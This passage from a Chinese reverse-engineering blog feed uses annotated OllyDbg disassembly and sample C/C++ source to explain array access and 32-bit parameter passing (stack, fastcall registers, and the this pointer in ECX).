循环计数器</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">00401026</span>  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">8</span>B06          <span class="token operator">/</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ESI<span class="token punctuation">]</span>              <span class="token punctuation">;</span>  esi <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> eax <span class="token operator">=</span> <span class="token number">0x11</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">00401028</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            <span class="token operator">|</span>PUSH EAX                                <span class="token punctuation">;</span>  将eax压栈</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">00401029</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">3</span>C704000   <span class="token operator">|</span>PUSH Arrays<span class="token punctuation">.</span><span class="token number">0040703</span>C                    <span class="token punctuation">;</span>  ASCII "<span class="token operator">%</span>d</pre></td></tr><tr><td data-num="17"></td><td><pre>"</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">1</span>D000000   <span class="token operator">|</span>CALL Arrays<span class="token punctuation">.</span><span class="token number">00401050</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">00401033</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       <span class="token operator">|</span>ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">00401036</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C6 <span class="token number">04</span>       <span class="token operator">|</span>ADD ESI<span class="token punctuation">,</span><span class="token number">4</span>                               <span class="token punctuation">;</span>  esi <span class="token operator">+</span> <span class="token number">4</span> esp <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">=</span>esp <span class="token operator">+</span> c <span class="token operator">=</span> <span class="token number">0x33</span>相当于索引自增</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">00401039</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">4F</span>            <span class="token operator">|</span>DEC EDI                                 <span class="token punctuation">;</span>  计数器减一</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token number">0040103</span>A  <span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">^</span> <span class="token number">75</span> EA         \JNZ SHORT Arrays<span class="token punctuation">.</span><span class="token number">00401026</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">0040103</span>C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5F</span>            POP EDI</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token number">0040103</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token number">0040103F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>E            POP ESI</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">00401040</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">0</span>C       ADD ESP<span class="token punctuation">,</span><span class="token number">0</span>C</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token number">00401043</span>  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220330190507180.png" alt="image-20220330190507180" /></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">MOV EDI<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EAX<span class="token operator">+</span><span class="token number">407030</span><span class="token punctuation">]</span></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dword ptr <span class="token punctuation">[</span>eax<span class="token operator">+</span><span class="token number">407030</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre>eax <span class="token operator">=</span> i </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">407030</span> <span class="token operator">=</span> a</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">add</span> <span class="token expression">eax<span class="token punctuation">,</span><span class="token number">4</span></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>eax <span class="token operator">=</span> <span class="token number">4</span></pre></td></tr><tr><td data-num="8"></td><td><pre>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> dword ptr <span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">407030</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">int</span><span class="token expression">类型占<span class="token number">4</span>个字节</span></span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>ESP<span class="token operator">+</span>EAX<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ECX</span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>esp <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>esp <span class="token operator">+</span> <span class="token number">0xc</span> <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre>esp <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token expression">MOV EAX<span class="token punctuation">,</span>DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ESI<span class="token punctuation">]</span></span></span></pre></td></tr><tr><td data-num="17"></td><td><pre>esi <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre>esi <span class="token operator">=</span> esp <span class="token operator">+</span> <span class="token number">0x8</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之32位参数传递</title>
    <url>/article/b4ab0f6d.html</url>
    <content><![CDATA[<h2 id="利用堆栈传递参数"><a class="anchor" href="#利用堆栈传递参数">#</a> 利用堆栈传递参数</h2>
<p>函数的参数分为以下几种传参方式：</p>
<ul>
<li>全局变量传参</li>
<li>堆栈传参</li>
<li>寄存器传参</li>
</ul>
<p>OD 打开分析；</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327171832502.png" alt="image-20220327171832502" /></p>
<p>可以看到如下为退出程序</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401009</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BD8          MOV EBX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">6</span>A <span class="token number">00</span>         PUSH <span class="token number">0</span>                                   <span class="token punctuation">;</span> <span class="token operator">/</span>ExitCode <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0040100</span>D  \<span class="token punctuation">.</span>  FF15 <span class="token number">00204000</span> CALL DWORD PTR DS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>KERNEL32<span class="token punctuation">.</span>ExitProces<span class="token operator">></span><span class="token punctuation">;</span> \ExitProcess</pre></td></tr></table></figure><p>f8 执行到 call 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327172023394.png" alt="image-20220327172023394" /></p>
<p>f7 进入</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0040101F</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">04</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">0</span>C       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401028</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B5D <span class="token number">08</span>       MOV EBX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">895</span>D FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EBX</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> FC       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401034</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401035</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327172038255.png" alt="image-20220327172038255" /></p>
<p>push ebp 是因为堆栈有俩个寄存器</p>
<ul>
<li>esp：栈顶指针</li>
<li>ebp：栈底指针</li>
</ul>
<p>而 push ebp 的作用则是将原来的堆栈保存起来，防止被破坏，从而开辟一个新的堆栈供之后的函数使用。</p>
<p>函数分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0040101</span>E      <span class="token number">00</span>            DB <span class="token number">00</span>                                    <span class="token punctuation">;</span>  ebp <span class="token operator">+</span> 的普遍是参数 ebp<span class="token operator">-</span> 的普遍是局部变量</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0040101F</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  保护现场</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401022</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">04</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401025</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">0</span>C       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span>             <span class="token punctuation">;</span>  参数<span class="token number">2</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401028</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B5D <span class="token number">08</span>       MOV EBX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  参数<span class="token number">1</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040102</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">895</span>D FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EBX             <span class="token punctuation">;</span>  将ebx也就是参数<span class="token number">1</span>放到局部变量中</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040102</span>E  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> FC       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  将参数<span class="token number">2</span>与局部变量相加</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401031</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span>                                <span class="token punctuation">;</span>  平栈</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401034</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP                                  <span class="token punctuation">;</span>  还原到上一个函数使用的栈</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401035</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span>                                   <span class="token punctuation">;</span>  返回</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327173155533.png" alt="image-20220327173155533" /></p>
<h2 id="利用寄存器传递参数"><a class="anchor" href="#利用寄存器传递参数">#</a> 利用寄存器传递参数</h2>
<h3 id="fastcall"><a class="anchor" href="#fastcall">#</a> fastcall</h3>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span>  __fastcall <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">,</span><span class="token keyword">long</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	    <span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">int</span> __fastcall <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">char</span> a<span class="token punctuation">,</span> <span class="token keyword">long</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">,</span> <span class="token keyword">int</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	   <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> c <span class="token operator">+</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327180829910.png" alt="image-20220327180829910" /></p>
<p>根据启动函数的规则，找到 fastcall</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327180846700.png" alt="image-20220327180846700" /></p>
<p>f9 执行到断点，f7 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327180943786.png" alt="image-20220327180943786" /></p>
<p>从这里看到，如果按堆栈传参来说只有俩个参数 push 4 和 push 3，而在这里的 call 它有四个参数，这里通过 fastcall 的调用约定，它前俩个参数使用的是寄存器传参，正常情况下使用的是 ecx 和 edx，而在这里使用的是 8 位的长度变量 cl，而 ecx 是 32 位的长度变量。</p>
<p>这里的前俩个参数使用寄存器传参，后俩个参数使用堆栈传参</p>
<p>f2 断点，f9 运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327181902478.png" alt="image-20220327181902478" /></p>
<p>f7 进入函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327181951038.png" alt="image-20220327181951038" /></p>
<p>函数分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401017</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  函数开始</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401018</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0040101</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>EC <span class="token number">08</span>       SUB ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0040101</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8955</span> F8       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EDX             <span class="token punctuation">;</span>  将eax存到ebp<span class="token operator">-</span><span class="token number">8</span>的局部变量中</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">884</span>D FC       MOV BYTE PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>CL               <span class="token punctuation">;</span>  将cl存到ebp<span class="token operator">-</span><span class="token number">4</span>的局部变量中</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0F</span>BE45 FC     MOVSX EAX<span class="token punctuation">,</span>BYTE PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  通过movsx将<span class="token number">8</span>位字符型的整数符号扩展到一个双字的长度</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> F8       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span>  加法</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040102</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">08</span>       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0040102</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00401030</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP                              <span class="token punctuation">;</span>  还原</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00401032</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00401033</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span>                                   <span class="token punctuation">;</span>  函数结束</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327182411588.png" alt="image-20220327182411588" /></p>
<h3 id="this指针"><a class="anchor" href="#this指针">#</a> this 指针</h3>
<p>C++ 中类的一个操作</p>
<p>样例源码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>class CSum</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>public<span class="token operator">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token comment">// 实际 Add 原型具有如下形式：Add (this,int a,int b)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>		<span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#123;</span>     </pre></td></tr><tr><td data-num="13"></td><td><pre>	CSum sum<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	sum<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>OD 打开：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327182912587.png" alt="image-20220327182912587" /></p>
<p>找到函数和入口点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327182958916.png" alt="image-20220327182958916" /></p>
<p>控制台 main 函数有 3 个参数</p>
<p>f7 进入函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220327183109344.png" alt="image-20220327183109344" /></p>
<p>可以看到三个参数，一个 ecx 寄存器传参，俩个堆栈传参</p>
<p>如下的 call 调用的就是上面源码中的类</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0040100</span>B  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">10000000</span>   CALL VF<span class="token punctuation">.</span><span class="token number">00401020</span>                         <span class="token punctuation">;</span> \VF<span class="token punctuation">.</span><span class="token number">00401020</span></pre></td></tr></table></figure><p>class CSum：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>class CSum</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>public<span class="token operator">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token keyword">int</span> <span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token comment">// 实际 Add 原型具有如下形式：Add (this,int a,int b)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>		<span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>f7 进入如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00401020</span>  <span class="token operator">/</span>$  <span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00401021</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00401023</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">51</span>            PUSH ECX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00401024</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">894</span>D FC       MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>ECX <span class="token operator">|</span>ecx就是this指针，将this指针放到ebp<span class="token operator">-</span><span class="token number">4</span>的局部变量中</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">00401027</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 <span class="token number">08</span>       MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0040102</span>A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">0345</span> <span class="token number">0</span>C       ADD EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">+</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0040102</span>D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0040102F</span>  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00401030</span>  \<span class="token punctuation">.</span>  C2 <span class="token number">0800</span>       RETN <span class="token number">8</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/DB317EB71685A21C9A2B761920DC4D4D.gif" alt="img-DB317EB71685A21C9A2B761920DC4D4D" /></p>
